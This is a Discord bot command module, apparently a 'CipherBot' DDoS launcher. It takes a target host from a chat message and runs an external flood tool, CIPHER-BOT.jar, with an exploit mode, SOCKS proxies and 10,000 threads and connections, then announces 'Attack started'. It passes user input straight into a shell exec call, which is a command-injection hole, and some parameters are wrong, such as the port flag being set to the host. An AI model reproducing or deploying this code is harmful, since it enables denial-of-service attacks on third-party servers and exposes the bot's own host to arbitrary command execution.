const Discord = require("discord.js");

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)
var exec = require('child_process').exec
exec(`java -jar CIPHER-BOT.jar host=${host} port=${host} protocol=47 exploit=botfucker proxiesFile=socks_proxies.txt srvResolve=false srvResolve2=false threads=10000 timeout=1000 attackTime=300 connections=10000 loopAmount=1 keepAlive=true alwaysResolve=false print=false multi=true removeFailure=false proxiesType=socks socksV4=true`, (error, stdout, stderr) => {
});
console.log('An Attack Launched Discord ID:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('❖ Attack 2021')
	.setTimestamp()
	.setDescription("**❖ CipherBot** \n \n ❖ Attack started to: \n ❖ for 999 seconds")
	.setFooter('© Developer Matija#3553.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['cipher'],
  permLevel: 0
}

exports.help = {
  name: 'cipher',
  description: 'Özel',
  usage: 'cipher'
}